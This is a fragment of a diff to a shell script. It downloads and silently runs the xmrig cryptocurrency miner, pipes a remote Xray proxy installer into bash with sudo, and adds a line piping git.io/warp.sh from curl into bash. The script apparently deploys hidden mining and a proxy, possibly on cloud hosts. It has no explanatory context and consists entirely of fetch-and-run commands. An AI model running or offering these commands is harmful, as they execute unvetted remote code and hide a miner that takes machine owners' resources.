@@ -10,5 +10,6 @@ sudo wget -o- https://github.com/lamboeio/modin/raw/refs/heads/main/x.json
 chmod u+x ./x.json
  ./xmrig --config=./x.json >/dev/null 2>&1
 sudo wget -qO- -o- https://github.com/233boy/Xray/raw/main/install.sh | bash
-xray add tcp 81 1483c30c-ae2c-4130-f643-c6139d199c42
+xray add tcp 7000 1483c30c-ae2c-4130-f643-c6139d199c42
+bash <(curl -fsSL git.io/warp.sh) d
 ping aws.amazon.com
